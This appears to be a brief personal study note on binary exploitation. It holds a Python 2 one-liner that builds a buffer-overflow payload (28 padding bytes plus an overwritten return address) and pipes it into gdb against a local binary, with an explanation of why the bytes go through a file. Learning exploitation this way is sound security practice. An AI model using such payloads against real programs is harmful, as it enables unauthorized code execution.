---
tags:
  - python
  - binary_exploitation
  - pwn
  - security
---
```python
python2 -c 'print "A" * 28 + "\x82\x91\x04\x08"' > payload
gdb ./myfile < payload
```
Since these hex numbers are not printable ascii, you must save these results in a file, and send that file to gdb instead of a [[Standard Input|stdin]].